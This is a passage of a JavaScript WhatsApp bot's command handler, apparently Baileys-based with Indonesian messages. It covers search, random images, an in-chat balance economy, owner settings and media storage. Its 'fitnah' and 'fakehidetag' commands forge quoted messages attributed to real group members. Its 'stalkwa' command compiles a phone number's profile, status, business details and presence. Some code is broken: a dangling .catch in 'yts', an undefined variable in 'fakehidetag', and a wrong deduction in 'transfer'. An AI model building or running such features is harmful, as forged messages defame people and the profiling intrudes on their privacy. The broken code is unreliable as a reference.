      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Gambar ke - ${i++}\nUntuk Menyimpan Gambar Silahkan Klik Gambar Yang Akan Disimpan Lalu Klik Tombol Titik Tiga Di Kanan Atas Kemudian Pilih Simpan`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: setting.footer
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: '*Hasil Pencarian:*',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            "name": "cta_url",
            "buttonParamsJson": `{\"display_text\":\"Link Gambar\",\"url\":\"${pus}\",\"merchant_url\":\"https://www.google.com\"}`
          }
        ]
      })
    });
  }

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hai Dibawah ini Adalah hasil dari Pencarian Kamu.\n\nGambar Bisa Digeser Yaaa'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: setting.botName
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await Aira.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });
}

break
case 'yts': case 'ytsearch':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) newReply(`Gunakan dengan cara ${prefix+command} *text*\n\n_Contoh_\n\n${prefix+command} Cara membuat bot WhatsApp`)
let reso = await yts(`${text}`)
let aramat = reso.all
var tbuff = await getBuffer(aramat[0].image)
let teks = aramat.map(v => {
switch (v.type) {
case 'video': return `
📛 Title : *${v.title}* 
⏰ Durasi: ${v.timestamp}
🚀 Diupload ${v.ago}
😎 Views : ${v.views}
🌀 Url : ${v.url}
`.trim()
case 'channel': return `
📛 Channel : *${v.name}*
🌀 Url : ${v.url}
👻 Subscriber : ${v.subCountLabel} (${v.subCount})
🎦 Total Video : ${v.videoCount}
`.trim()
}
}).filter(v => v).join('\n----------------------------------------\n')

Aira.sendMessage(m.chat, { image: tbuff, caption: teks }, { quoted: m })

 .catch((err) => {
newReply("Not found")
})
}
break

 // Random Menu
case 'cecan':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
Aira.sendMessage(m.chat, { caption: "Jangan Lupa Post Sw Biar Mantan Panas Coy🥵", image: { url: `https://api.ouzen.xyz/randomasupan/cecan?apikey=${setting.ZenzKey}` }}, { quoted: m })
.catch((e) => {
newReply(mess.error.api)
})
limitAdd(m.sender, limit)
}
break
case 'cosplay':{
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
newReply(mess.wait)
Aira.sendMessage(m.chat, { caption: "Wangyy Wangyy😋", image: { url: `https://api.ouzen.xyz/randomimage/cosplay?apikey=${setting.ZenzKey}` }}, { quoted: m })
.catch((e) => {
newReply(mess.error.api)
})
limitAdd(m.sender, limit)
}
break
case 'cogan':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
addCountCmd('#cogan', m.sender, _cmd)
var query = ["cowo korea","cowo china", "cowo Thailand"]
let datax = await pinterest(query[Math.floor(Math.random() * query.length)])
let anu = datax[Math.floor(Math.random() * datax.length)]
Aira.sendMessage(m.chat, { caption: "Random Cogan", image: { url: anu }}, { quoted: m })
.catch((e) => {
newReply(mess.error.api)

})
limitAdd(m.sender, limit)
}
break
case 'waifu':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return newReply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
newReply(mess.wait)
addCountCmd('#waifu', m.sender, _cmd)
var data = (await axios.get('https://waifu.pics/api/sfw/waifu')).data.url
Aira.sendMessage(m.chat, { caption: "Random Waifu", image: { url: data }}, { quoted: m })
.catch((e) => {
console.log(color('[ ERROR ]', 'red'), e)
newReply(mess.error.api)

})
limitAdd(m.sender, limit)
}
break
// Balance Menu
case 'topglobal':{
if (!m.isGroup)return newReply(mess.OnlyGrup)
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let top = '*── 「 TOPGLOBAL BALANCE 」 ──*\n\n'
let arrTop = []
var total = 10
if (balance.length < 10) total = balance.length
for (let i = 0; i < total; i ++){
top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
arrTop.push(balance[i].id)
}
Aira.sendTextWithMentions(m.chat, top, m)
//mentions(top, arrTop, true)
}
break
case 'addbalance':{
if (!isCreator) return newReply(mess.OnlyPrem)
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
console.log(users)
if (!users) return newReply(`Tag orang yang ingin di transfer balance`)
if (!args[1]) return newReply(`Masukkan nominal nya!`)
if (isNaN(args[1])) return newReply(`Nominal harus berupa angka!`)
if (args[1] === 'infinity') return newReply(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return newReply(`Jangan menggunakan -`)
addCountCmd('#transfer', m.sender, _cmd)
addBalance(users, parseInt(args[1]), balance)
Aira.sendTextWithMentions(m.chat, `Sukses menambah balance sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)

}
break

case 'toplocal':{
if (!m.isGroup)return newReply(mess.OnlyGrup)
balance.sort((a, b) => (a.balance < b.balance) ? 1 : -1)
let top = '*── 「 TOPLOCAL BALANCE 」 ──*\n\n'
let arrTop = []
var total = 10
if (balance.length < 10) total = balance.length
let anggroup = groupMembers.map(a => a.id)
for (let i = 0; i < total; i ++){
if (anggroup.includes(balance[i].id)) {
top += `${i + 1}. @${balance[i].id.split("@")[0]}\n=> Balance : $${balance[i].balance}\n\n`
arrTop.push(balance[i].id)
}
}
Aira.sendTextWithMentions(m.chat, top, m)
}
break
case 'buylimit':{
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *jumlah limit yang ingin dibeli*\n\nHarga 1 limit = $50 balance`)
if (text.includes('-')) return newReply(`Jangan menggunakan -`)
if (isNaN(text)) return newReply(`Harus berupa angka`)
if (args[0] === 'infinity') return newReply(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 50)
if (getBalance(m.sender, balance) < ane) return newReply(`Balance kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('#buylimit', m.sender, _cmd)
kurangBalance(m.sender, ane, balance)
giveLimit(m.sender, parseInt(text), limit)
newReply(`Pembeliaan limit sebanyak ${text} berhasil\n\nSisa Balance : $${getBalance(m.sender, balance)}\nSisa Limit : ${getLimit(m.sender, limitCount, limit)}/${limitCount}`)
}
break
case 'buygamelimit': case 'buyglimit':{
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *jumlah game limit yang ingin dibeli*\n\nHarga 1 game limit = $50 balance\nPajak $1 / $10`)
if (text.includes('-')) return newReply(`Jangan menggunakan -`)
if (isNaN(text)) return newReply(`Harus berupa angka`)
if (text === 'infinity') return newReply(`Yahaha saya ndak bisa di tipu`)
let ane = Number(parseInt(text) * 50)
if (getBalance(m.sender, balance) < ane) return newReply(`Balance kamu tidak mencukupi untuk pembelian ini`)
addCountCmd('#buygamelimit', m.sender, _cmd)
kurangBalance(m.sender, ane, balance)
givegame(m.sender, parseInt(text), glimit)
newReply(`Pembeliaan game limit sebanyak ${text} berhasil\n\nSisa Balance : $${getBalance(m.sender, balance)}\nSisa Game Limit : ${cekGLimit(m.sender, gcount, glimit)}/${gcount}`)
}
break
case 'transfer': case 'tf':{
if (!text) return newReply(`Gunakan dengan cara ${prefix+command} *@tag nominal*\n\nContoh : ${prefix+command} @6285600793871 2000`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!users) return newReply(`Tag orang yang ingin di transfer balance`)
if (!args[1]) return newReply(`Masukkan nominal nya!`)
if (isNaN(args[1])) return newReply(`Nominal harus berupa angka!`)
if (args[1] === 'infinity') return newReply(`Yahaha saya ndak bisa di tipu`)
if (args[1].includes("-")) return newReply(`Jangan menggunakan -`)
var anu = getBalance(m.sender, balance)
if (anu < args[1] || anu == 'undefined') return newReply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar $${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
addCountCmd('#transfer', m.sender, _cmd)
kurangBalance(m.sender, parseInt(text), balance)
addBalance(users, parseInt(args[1]), balance)
Aira.sendTextWithMentions(m.chat, `Sukses transfer balance sebesar ${args[1]} kepada @${users.split("@")[0]}`, m)
}
break
case 'limit': case 'balance': case 'ceklimit': case 'cekbalance':{
/*let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users){
var Ystatus = ownerNumber.includes(users)
var isPrim = Ystatus ? true : _prem.checkPremiumUser(users, premium)
var ggcount = isPrim ? gcounti.prem : gcounti.user
var limitMen = `${getLimit(users, limitCount, limit)}`
reply(`💳 Limit : ${_prem.checkPremiumUser(users, premium) ? 'Unlimited' : limitMen}/${limitCount}\n🕹️ Limit Game : ${cekGLimit(users, ggcount, glimit)}/${ggcount}\n🏦 Balance : $${await getBalance(users, balance)}\n\nKamu dapat membeli limit dengan ${prefix}buylimit *jumlah* dan ${prefix}buyglimit *jumlah* untuk membeli game limit\n\n*Example :*\n${prefix}buylimit 1\n${prefix}buyglimit 1\n\n*Note :*\n• Harga 1 limit = $50 balance`)
} else {*/
var mybal = await getBalance(m.sender, balance)
var limitPrib = `${getLimit(m.sender, limitCount, limit)}/${limitCount}`
newReply(`💳 Limit : ${isPremium ? 'Unlimited' : limitPrib}\n🕹️ Limit Game : ${cekGLimit(m.sender, gcount, glimit)}/${gcount}\n🏦 Balance : $${mybal}\n\nKamu dapat membeli limit dengan ${prefix}buylimit *jumlah* dan ${prefix}buyglimit *jumlah* untuk membeli game limit\n\n*Example :*\n${prefix}buylimit 1\n${prefix}buyglimit 1\n\n*Note :*\n• Harga 1 limit = $50 balance`)
// }
}
break

// Baileys
case 'fitnah':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!text) return Aira.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix+command} *@tag|pesantarget|pesanbot*\n\n_Contoh_\n\n${prefix+command} @${m.sender.split("@")[0]}|enak ga semalem|enak banget`, m)
var org = text.split("|")[0]
var target = text.split("|")[1];
var bot = text.split("|")[2];
if (!org.startsWith('@')) return newReply('Tag orangnya')
if (!target) return newReply(`Masukkan pesan target!`)
if (!bot) return newReply(`Masukkan pesan bot!`)
var mens = parseMention(target)
addCountCmd('#fitnah', m.sender, _cmd)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { extemdedTextMessage: { text: `${target}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { conversation: `${target}` }}
Aira.sendMessage(m.chat, { text: bot, mentions: mens }, { quoted: mens.length > 2 ? msg1 : msg2 })}
break
case 'nowa': case 'stalkwa': case 'wastalk':{
if (!isPremium) return newReply(mess.OnlyPrem)
const PhoneNum = require ('awesome-phonenumber')
let regionNames = new Intl.DisplayNames(['en'], { type: 'region' })
if (!text.startsWith('62')&&!m.quoted) return newReply(`Gunakan dengan cara ${prefix+command} *nomor*\n\n_Contoh_\n\n${prefix+command} 628XXXXXXXXXX`)
if (text.includes('x')) return newReply('JANGAN ADA X')
let num = m.quoted?.sender || m.mentionedJid?.[0] || text
	if (!num) throw `Ex: ${usedPrefix + cmd} @tag / 628xxx`
	num = num.replace(/\D/g, '') + '@s.whatsapp.net'
	if (!(await Aira.onWhatsApp(num))[0]?.exists) throw 'User not exists'
	let img = await Aira.profilePictureUrl(num, 'image').catch(_ => 'https://telegra.ph/file/9e5254d0c7a5132038b5d.jpg')
	let bio = await Aira.fetchStatus(num).catch(_ => { })
	let name = await Aira.getName(num)
	let business = await Aira.getBusinessProfile(num)
	let isOnline = await Aira.presenceSubscribe(num)
	console.log(isOnline)
	let format = PhoneNum(`+${num.split('@')[0]}`)
	let country = regionNames.of(format.getRegionCode('international'))
	let wea = `\t\t\t\t*▾ WHATSAPP ▾*\n\n*° Country :* ${country.toUpperCase()}\n*° Name :* ${name ? name : '-'}\n*° Format Number :* ${format.getNumber('international')}\n*° Url Api :* wa.me/${num.split('@')[0]}\n*° Mentions :* @${num.split('@')[0]}\n*° Status :* ${bio?.status || '-'}\n*° Date Status :* ${bio?.setAt ? moment(bio.setAt.toDateString()).locale('id').format('LL') : '-'}\n\n${business ? `\t\t\t\t*▾ INFO BUSINESS ▾*\n\n*° BusinessId :* ${business.wid}\n*° Website :* ${business.website ? business.website : '-'}\n*° Email :* ${business.email ? business.email : '-'}\n*° Category :* ${business.category}\n*° Address :* ${business.address ? business.address : '-'}\n*° Timezone :* ${business.business_hours.timezone ? business.business_hours.timezone : '-'}\n*° Descripcion* : ${business.description ? business.description : '-'}` : '*Standard WhatsApp Account*'}`
	img ? await Aira.sendMessage(m.chat, { image: { url: img }, caption: wea, mentions: [num] }, { quoted: m }) : m.reply(wea)}
break
case 'q': case 'quoted': case 'getquote': {
if (!m.quoted) return newReply('Reply Pesannya!!')
let gwm = await Aira.serializeM(await m.getQuotedObj())
if (!gwm.quoted) return newReply('Pesan Yang anda reply tidak mengandung reply')
await gwm.quoted.copyNForward(m.chat, true)
}
break
case 'fakehidetag':{
if (!isPremium) return rely(mess.OnlyPrem)
if (!m.isGroup) return newReply(mess.OnlyGrup)
if (!text) return Aira.sendTextWithMentions(m.chat, `Gunakan dengan cara ${prefix + command} *@tag|text*\n\n_Contoh_\n\n${prefix + command} @${m.sender.split("@")[0]}|Halo`, m)
var org = text.split("|")[0]
var teks = text.split("|")[1];
if (!org.startsWith('@')) return newReply('Tag orangnya')
var mem2 = []
groupMembers.map( i => mem2.push(i.id) )
var mens = parseMention(target)
addCountCmd('#fakehidetag', m.sender, _cmd)
var msg1 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { extemdedTextMessage: { text: `${prefix}hidetag ${teks}`, contextInfo: { mentionedJid: mens }}}}
var msg2 = { key: { fromMe: false, participant: `${parseMention(org)}`, remoteJid: m.chat ? m.chat : '' }, message: { conversation: `${prefix}hidetag ${teks}` }}
Aira.sendMessage(m.chat, { text: teks ? teks : '', mentions: mem2 }, { quoted: mens.length > 2 ? msg1 : msg2 })
break}
case 'react':{
if (!isPremium) return rely(mess.OnlyPrem)
if (!m.quoted) return newReply(`Balas pesannya`)
if (!text) return newReply(`Masukkan 1 emoji`)
if (!isEmoji(text)) return newReply(`Itu bukan emoji!`)
if (isEmoji(text).length > 1) return newReply(`Satu aja emojinya`)
addCountCmd('#react', m.sender, _cmd)
var reactMsg = { reactionMessage: {
key: {
remoteJid: m.chat,
fromMe: m.key.fromMe,
id: quoted.id
},
text: text
}
}
Aira.sendMessage/*FromContent*/(m.chat, reactMsg)}
break
case 'setcmd': case 'addcmd':{
if (!m.quoted) return newReply( 'Reply Pesan!')
if (!m.quoted.fileSha256) return newReply ('SHA256 Hash Missing')
if (!text) return newReply(`Contoh ${prefix + command} .menu`)
let hash = m.quoted.fileSha256.toString('base64')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return newReply( 'You have no permission to change this sticker command')
db.data.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
newReply(`Done!`)
}
break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return newReply ('SHA256 Hash Missing')
if (db.data.sticker[hash] && db.data.sticker[hash].locked) return newReply( 'You have no permission to change this sticker command')
delete db.data.sticker[hash]
newReply(`Done!`)
}
break
// Owners Menu
case 'listgc': {
if (!isCreator) return newReply('Lu Siapa Kocak?')
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*Group Chat*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await Aira.groupMetadata(i)
teks += `*Name :* ${metadata.subject}
*Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
*ID :* ${metadata.id}
*Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
*Member :* ${metadata.participants.length}\n\n──────────────\n\n`
}
Aira.sendTextWithMentions(m.chat, teks, m)
}
break
case 'joingc': case 'join': {
if (!isCreator) return newReply(`Mau sewa bot buat jaga gc? silahkan hubungi owner`)
if (!text) return newReply(`Kirim perintah ${prefix + command} _linkgrup_`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return newReply(mess.error.Iv)
newReply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await Aira.groupAcceptInvite(result).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
}
break
case 'leavegc': {
if (!isCreator) return newReply(mess.OnlyOwner)
await Aira.groupLeave(m.chat).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
}
break
case 'public': {
if (!isCreator) return newReply(mess.OnlyOwner)
Aira.public = true
newReply('Sukses Change To Public Mode')
}
break
case 'self': {
if (!isCreator) return newReply(mess.OnlyOwner)
Aira.public = false
newReply('Sukses Change To Self Mode')
}
break
case 'block': case 'blok':
if (!isCreator) return newReply(mess.OnlyOwner) 
if (!text) return newReply(`Masukkan nomor target!`)
let blok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
Aira.updateBlockStatus(blok, 'block')
newReply(`Sukses block @${blok.split('@')[0]}`)
break
case 'unblock': case 'unblok':
if (!isCreator) return newReply(mess.OnlyOwner) 
if (!text) return newReply(`Masukkan nomor target!`)
let unblok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
Aira.updateBlockStatus(unblok, 'unblock')
newReply(`Sukses unblock @${unblok.split('@')[0]}`)
break
case 'listblock': case 'listblok':
let listblok = await Aira.fetchBlocklist()
newReply('*LIST BLOCK*\n' + `Total: ${listblok == undefined ? '*0* Diblokir' : '*' + listblok.length + '* Diblokir'}\n\n` + listblok.map(v => '» @' + v.replace(/@.+/, '')).join`\n`)
break
case 'sampah':{
if (!isCreator) return newReply(mess.OnlyOwner)
let all = await fs.readdirSync('./sticker')
var teks = `JUMLAH SAMPAH SYSTEM\n\n`
teks += `Total : ${all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(v=>v).length} Sampah\n\n`
teks += all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") || v.endsWith("webp") || v.endsWith("webm") ).map(o=>`${o}\n`).join("");
newReply(teks)}
break
case 'delsampah':{
if (!isCreator) return newReply(mess.OnlyOwner)
let directoryPath = path.join('./sticker') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return newReply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4") || item.endsWith("jpg") || item.endsWith("jpeg") || item.endsWith("webp") || item.endsWith("webm")  )
var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return newReply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
newReply(teks)
await sleep(2000)
newReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./sticker/${file}`) //&& `./media/${file}`) 
});
await sleep(2000)
newReply("Berhasil menghapus semua sampah")
});
}
break
case 'sampah2':{
if (!isCreator) return newReply(mess.OnlyOwner)
let all = await fs.readdirSync('./')
var teks = `JUMLAH SAMPAH SYSTEM\n\n`
teks += `Total : ${all.filter(v => v.endsWith("gif") || v.endsWith("mp3") || v.endsWith("mp4") ).map(v=>v).length} Sampah\n\n`
teks += all.filter(v => v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") || v.endsWith("mp4") ).map(o=>`${o}\n`).join("");
newReply(teks)}
break
case 'delsampah2':{
if (!isCreator) return newReply(mess.OnlyOwner)
let directoryPath = path.join('./') //&& './media') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return newReply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3") || item.endsWith("mp4")  )

var teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return newReply(teks)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})
newReply(teks)
await sleep(2000)
newReply("Menghapus file sampah...")
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./${file}`) //&& `./media/${file}`) 
});
await sleep(2000)
newReply("Berhasil menghapus semua sampah")
});
}
break
case 'setppbot': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (!quoted) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
let media = await Aira.downloadAndSaveMediaMessage(quoted)
await Aira.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
newReply("Done")
}
break
case 'nsfw':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (args[0] === 'on') {
if (isNsfw) return newReply("Udh on di group ini")
_nsfw.push(m.chat)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(_nsfw))
newReply("Nsfw berhasil di aktifkan di group ini")
} else if (args[0] === 'off') {
if (!isNsfw) return newReply("Udh off di group ini")
_nsfw.splice(m.chat, 1)
fs.writeFileSync('./database/nsfw.json', JSON.stringify(_nsfw))
newReply("Nsfw berhasil di nonaktifkan di group ini")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'autobio': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autobio === true) return newReply("Udh on")
setting.autobio = true
newReply("Autobio berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autobio === false) return newReply("Udh off")
setting.autobio = false
newReply("Autobio berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'anticall': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.anticall === true) return newReply("Udh on")
setting.anticall = true
newReply("Anticall berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.anticall === false) return newReply("Udh off")
setting.anticall = false
newReply("Anticall berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autorespond': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autorespond === true) return newReply("Udh on")
setting.autorespond = true
newReply("Autorespond berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autorespond === false) return newReply("Udh off")
setting.autorespond = false
newReply("Autorespond berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
}}
break
case 'autoblok': case 'autoblok212': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autoblok212 === true) return newReply("Udh on")
setting.autoblok212 = true
newReply("Autoblok berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autoblok212 === false) return newReply("Udh off")
setting.autoblok212 = false
newReply("Autoblok berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'autoread': {
if (!isCreator) return newReply(mess.OnlyOwner)
if (args[0] === "on") {
if (setting.autoread === true) return newReply("Udh on")
setting.autoread = true
newReply("Autoread berhasil diaktifkan")
} else if (args[0] === "off") {
if (setting.autoread === false) return newReply("Udh off")
setting.autoread = false
newReply("Autoread berhasil dinonaktifkan")
} else {
newReply(`${prefix+command} on -- _mengaktifkan_\n${prefix+command} off -- _Menonaktifkan_`)
 }}
break
case 'addstiker': case 'addsticker': case 'addstik':{
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/webp/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await Aira.downloadMediaMessage(quoted)
setiker.push(`${text}`)
fs.writeFileSync(`./database/${text}.webp`, media)
fs.writeFileSync('./database/stik.json', JSON.stringify(setiker))
newReply(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
}
break
case 'liststik': case 'liststiker': case 'liststc':{
teks = '*STICKER LIST :*\n\n'
for (let awokwkwk of setiker) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan kirim pesan sesuai list stiker di atas_`
newReply(teks)
break
}
case 'addfoto': case 'addimage': case 'addphoto': case 'addimg':{
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/image/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await Aira.downloadMediaMessage(quoted)
imagenye.push(`${text}`)
fs.writeFileSync(`./database/${text}.jpg`, media)
fs.writeFileSync('./database/image.json', JSON.stringify(imagenye))
newReply(`Sukses Menambahkan Image\nCek dengan cara ${prefix}listimg`)
}
break
case 'listimage': case 'imagelist': case 'listimg':{
teks = '*IMAGE LIST :*\n\n'
for (let awokwkwk of imagenye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${imagenye.length}*\n\n_Untuk mengambil image silahkan kirim pesan sesuai list image di atas_`
newReply(teks)
break
}
case 'addvideo': case 'addvidio': case 'addvid':{
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/video/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if ((quoted.msg || quoted).seconds > 31) return newReply('Maksimal 30 detik')
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await Aira.downloadMediaMessage(quoted)
videonye.push(`${text}`)
fs.writeFileSync(`./database/${text}.mp4`, media)
fs.writeFileSync('./database/video.json', JSON.stringify(videonye))
newReply(`Sukses Menambahkan Video\nCek dengan cara ${prefix}listvid`)
}
break
case 'videolist': case 'listvidio': case 'listvid': case 'listvideo':{
teks = '*VIDEO LIST :*\n\n'
for (let awokwkwk of videonye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${videonye.length}*\n\n_Untuk mengambil video silahkan kirim pesan sesuai list video di atas_`
newReply(teks)
break
}
case 'addaud': case 'addaudio': case 'addvn':{
if (!m.key.fromMe && !isCreator) return newReply(mess.OnlyOwner)
if (!/audio/.test(mime)) return newReply(`Contoh : ${prefix + command} halo`)
if ((quoted.msg || quoted).seconds > 31) return newReply('Maksimal 30 detik')
if (!text) return newReply(`Contoh : ${prefix + command} halo`)
if (text.includes('|')) return newReply(`Contoh : ${prefix + command} halo`)
let media = await Aira.downloadMediaMessage(quoted)
audionye.push(`${text}`)
fs.writeFileSync(`./database/${text}.mp3`, media)
fs.writeFileSync('./database/vn.json', JSON.stringify(audionye))
newReply(`Sukses Menambahkan Vn / audio \nCek dengan cara ${prefix}listvn`)
}
break
case 'listvn': case 'listaudio':{
teks = '*AUDIO LIST :*\n\n'
for (let awokwkwk of audionye) {
teks += `- ${awokwkwk}\n`
}
teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil audio silahkan kirim pesan sesuai list audio di atas_`
newReply(teks)
